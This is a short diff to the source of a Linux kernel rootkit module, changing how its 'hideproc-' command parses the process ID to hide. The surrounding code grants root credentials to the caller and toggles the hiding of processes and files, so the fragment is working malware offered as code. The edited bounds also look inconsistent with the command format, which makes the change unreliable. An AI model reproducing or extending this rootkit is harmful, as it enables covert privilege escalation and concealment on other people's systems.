@@ -174,7 +174,7 @@ static ssize_t rootkit_write(struct file *file, const char __user *buff, size_t 
 		(credentials->gid).val = (credentials->egid).val = 0;
 		commit_creds(credentials);
 	} else if (!strncmp(kernel_buff, "hideproc-", MIN(9, count))) {//upXXXXXX hides process with given id
-		if (current_pid < MAX_PIDS) copy_from_user(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
+		if (current_pid < MAX_PIDS) copy_from_user(pids_to_hide[current_pid++], buff+9, MIN(14, count-2));
 	} else if (!strncmp(kernel_buff, "unhideproc", MIN(10, count))) {//unhides last hidden process
 		if (current_pid > 0) current_pid--;
 	} else if (!strncmp(kernel_buff, "hidefile", MIN(8, count))) {//toggles hide files in fs
